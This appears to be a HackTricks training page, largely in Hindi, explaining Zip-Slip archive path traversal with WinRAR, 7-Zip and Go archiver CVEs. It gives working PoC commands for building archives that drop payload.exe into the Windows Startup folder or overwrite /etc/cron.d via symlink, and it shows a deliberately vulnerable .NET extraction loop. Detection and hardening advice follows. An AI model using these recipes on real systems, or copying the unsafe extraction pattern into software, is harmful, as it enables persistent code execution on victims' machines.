# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## अवलोकन

Many archive formats (ZIP, RAR, TAR, 7-ZIP, etc.) allow each entry to carry its own **आंतरिक पथ**. जब कोई extraction utility उस पथ को बिना जाँचे-परखे सम्मानित कर देती है, तो एक crafted filename जिसमें `..` या एक **absolute path** (उदा. `C:\Windows\System32\`) होगा, वह user-chosen directory के बाहर लिखा जा सकता है।
यह वर्ग की vulnerability व्यापक रूप से *Zip-Slip* या **archive extraction path traversal** के नाम से जाना जाता है।

परिणाम मनमाने फाइलों को ओवरराइट करने से लेकर सीधे **remote code execution (RCE)** हासिल करने तक हो सकते हैं, अगर payload किसी **auto-run** स्थान (जैसे Windows *Startup* folder) में गिरा दिया जाए।

## मूल कारण

1. Attacker एक archive बनाता है जहाँ एक या अधिक file headers में शामिल होते हैं:
* सापेक्ष ट्रैवर्सल अनुक्रम (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* निरपेक्ष पथ (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* या ऐसे crafted **symlinks** जो लक्ष्य निर्देशिका के बाहर resolve होते हैं (common in ZIP/TAR on *nix*).
2. पीड़ित एक vulnerable tool के साथ archive को extract करता है जो embedded path (या symlinks) पर भरोसा करता है बजाय इसके कि उसे sanitize किया जाए या extraction को चुनी हुई directory के अंतर्गत रोक दिया जाए।
3. फाइल हमलावर-नियंत्रित स्थान पर लिखी जाती है और अगली बार जब सिस्टम या उपयोगकर्ता उस पथ को ट्रिगर करता है तो वह निष्पादित/लोड हो जाती है।

### .NET `Path.Combine` + `ZipArchive` traversal

A common .NET anti-pattern is combining the intended destination with **उपयोगकर्ता-नियंत्रित** `ZipArchiveEntry.FullName` and extracting without path normalisation:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- यदि `entry.FullName` `..\\` से शुरू होता है तो यह traverses; यदि यह एक **absolute path** है तो बाएँ-हाथ का घटक पूरी तरह हटा दिया जाता है, जिससे extraction identity के रूप में एक **arbitrary file write** उत्पन्न होता है।
- Proof-of-concept archive जो एक sibling `app` directory में लिखने के लिए है जिसे एक scheduled scanner द्वारा मॉनिटर किया जाता है:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
उस ZIP को monitored inbox में डालने पर `C:\samples\app\0xdf.txt` बनता है, जो `C:\samples\queue\` के बाहर traversal की पुष्टि करता है और follow-on primitives (e.g., DLL hijacks) सक्षम करता है।

## वास्तविक उदाहरण – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR for Windows (including the `rar` / `unrar` CLI, the DLL and the portable source) extraction के दौरान filenames को validate करने में विफल रहा।
एक दुर्भावनापूर्ण RAR archive जिसमें इस तरह की entry शामिल हो, जैसे:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
यह चयनित आउटपुट निर्देशिका के **बाहर** और उपयोगकर्ता के *Startup* फ़ोल्डर के अंदर समाप्त हो जाएगा। लॉगऑन के बाद Windows वहाँ मौजूद सभी चीज़ों को स्वचालित रूप से निष्पादित करता है, जिससे *persistent* RCE मिलता है।

### PoC Archive बनाना (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
उपयोग किए गए विकल्प:
* `-ep`  – फ़ाइल पथ ठीक वैसे ही स्टोर करें जैसे दिए गए हैं (आगे के `./` को **न** हटाएँ)।

`evil.rar` को पीड़ित तक पहुँचाएँ और उन्हें इसे किसी vulnerable WinRAR build से extract करने के लिए निर्देश दें।

### वास्तविक दुनिया में देखे गए शोषण

ESET ने RomCom (Storm-0978/UNC2596) spear-phishing campaigns की रिपोर्ट की जिन्होंने RAR archives का दुरुपयोग कर CVE-2025-8088 का उपयोग करके customised backdoors deploy करने और ransomware operations की सुविधा देने के लिए संलग्न किया।

## नवीनतम मामले (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **बग**: ZIP entries जो **symbolic links** हैं, उन्हें extraction के दौरान dereferenced किया जाता था, जिससे attackers destination directory से बाहर निकलकर arbitrary paths overwrite कर सकते थे। User interaction केवल archive को *open/ extract* करना था।
* **प्रभावित**: 7-Zip 21.02–24.09 (Windows & Linux builds)। Fixed in **25.00** (July 2025) और बाद के संस्करण।
* **प्रभाव पथ**: `Start Menu/Programs/Startup` या service-run locations overwrite करें → अगली logon या service restart पर कोड चलता है।
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
एक patched build पर `/etc/cron.d` प्रभावित नहीं होगा; symlink /tmp/target के अंदर एक link के रूप में निकालेगा।

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **बग**: `archiver.Unarchive()` `../` और symlinked ZIP entries का पालन करता है, जिससे यह `outputDir` के बाहर लिखता है।
* **प्रभावित**: `github.com/mholt/archiver` ≤ 3.5.1 (project अब deprecated)।
* **Fix**: `mholt/archives` ≥ 0.1.0 पर स्विच करें या write से पहले canonical-path checks लागू करें।
* **न्यूनतम पुनरुत्पादन**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## पता लगाने के सुझाव

* **Static inspection** – Archive entries को list करें और किसी भी नाम को flag करें जिसमें `../`, `..\\`, *absolute paths* (`/`, `C:`) हो या ऐसे entries जो *symlink* हैं और जिनका target extraction dir के बाहर हो।
* **Canonicalisation** – सुनिश्चित करें कि `realpath(join(dest, name))` अभी भी `dest` से शुरू होता है। अन्यथा अस्वीकार करें।
* **Sandbox extraction** – एक disposable directory में decompress करें किसी *safe* extractor का उपयोग करके (उदा., `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) और सत्यापित करें कि resulting paths डायरेक्टरी के अंदर ही रहें।
* **Endpoint monitoring** – WinRAR/7-Zip/etc. द्वारा archive खुले जाने के तुरंत बाद `Startup`/`Run`/`cron` लोकेशन्स में लिखे गए नए executables पर alert करें।

## रोकथाम और हार्डनिंग

1. **Extractor को अपडेट करें** – WinRAR 7.13+ और 7-Zip 25.00+ path/symlink sanitisation लागू करते हैं। दोनों टूल्स में अभी भी auto-update का अभाव है।
2. जहाँ संभव हो, archives को “**Do not extract paths**” / “**Ignore paths**” विकल्प के साथ extract करें।
3. Unix पर extraction से पहले privileges घटाएँ और एक **chroot/namespace** mount करें; Windows पर **AppContainer** या sandbox का उपयोग करें।
4. यदि custom code लिख रहे हैं, तो `realpath()`/`PathCanonicalize()` से normalise करें **create/write** से पहले, और किसी भी entry को अस्वीकार करें जो destination से बाहर निकलता है।

## अन्य प्रभावित / ऐतिहासिक मामले

* 2018 – Snyk द्वारा व्यापक *Zip-Slip* advisory जिसने कई Java/Go/JS libraries को प्रभावित किया।
* 2023 – 7-Zip CVE-2023-4011 समान traversal `-ao` merge के दौरान।
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) slugs में TAR extraction traversal (patch v1.2 में)।
* कोई भी custom extraction logic जो write से पहले `PathCanonicalize` / `realpath` कॉल करने में नाकाम रहे।

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
